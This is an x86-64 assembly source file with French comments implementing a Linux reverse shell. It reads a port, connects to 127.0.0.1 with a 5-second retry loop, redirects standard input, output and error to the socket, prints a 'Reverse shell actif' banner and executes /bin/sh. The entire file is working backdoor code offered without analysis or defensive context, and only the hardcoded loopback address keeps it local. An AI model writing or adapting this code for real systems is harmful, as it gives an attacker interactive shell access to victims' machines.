section .bss
port_input resb 6         ; buffer pour lire "4444\n"

section .data
sockaddr:
    dw 2                  ; AF_INET
    dw 0                  ; port (sera mis dynamiquement)
    dd 0x0100007F         ; IP = 127.0.0.1
    dq 0

shellpath: db "/bin/sh", 0

prompt: db "Port ? ", 0
prompt_len equ $ - prompt

banner: db 10, 27, "[32m[*] Reverse shell actif. Bienvenue !", 10, 27, "[0m", 10
banner_len equ $ - banner

timespec_5s:
    dq 5
    dq 0

section .text
global _start

_start:
    ; afficher le prompt
    mov     rax, 1              ; syscall write
    mov     rdi, 1              ; stdout
    lea     rsi, [rel prompt]
    mov     rdx, prompt_len
    syscall

    ; lire l’entrée (ex: 4444\n)
    mov     rax, 0              ; syscall read
    mov     rdi, 0              ; stdin
    lea     rsi, [rel port_input]
    mov     rdx, 6
    syscall

    ; convertir ASCII → entier dans rbx
    xor     rbx, rbx            ; port = 0
    xor     rcx, rcx            ; index = 0
.convert_loop:
    movzx   rax, byte [port_input + rcx]
    cmp     rax, 10             ; '\n'
    je      .convert_done
    sub     rax, '0'
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    cmp     rcx, 5
    jl      .convert_loop
.convert_done:

    ; rbx = port, on le convertit en big-endian → ax = 0x5c11
    mov     ax, bx
    xchg    al, ah
    mov     word [sockaddr + 2], ax     ; injecter le port dans sockaddr

.retry_connection:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; connect(socket_fd, &sockaddr, 16)
    mov     rax, 42
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    syscall
    test    rax, rax
    js      .wait_retry

.success_connection:
    ; dup2(socket_fd, 0,1,2)
    mov     rsi, 2
.dup_loop:
    mov     rax, 33
    mov     rdi, r12
    mov     rdx, rsi
    syscall
    dec     rsi
    jns     .dup_loop

    ; write bannière fancy
    mov     rax, 1
    mov     rdi, r12
    lea     rsi, [rel banner]
    mov     rdx, banner_len
    syscall

    ; récupérer envp depuis la stack
    mov     rbx, [rsp]
    lea     rbx, [rsp + 8 + rbx*8]
    add     rbx, 8

    ; execve("/bin/sh", NULL, envp)
    mov     rax, 59
    lea     rdi, [rel shellpath]
    xor     rsi, rsi
    mov     rdx, rbx
    syscall

    ; exit(0)
    mov     rax, 60
    xor     rdi, rdi
    syscall

.wait_retry:
    ; close socket
    mov     rax, 3
    mov     rdi, r12
    syscall

    ; dormir 5 sec
    mov     rax, 35
    lea     rdi, [rel timespec_5s]
    xor     rsi, rsi
    syscall

    jmp .retry_connection
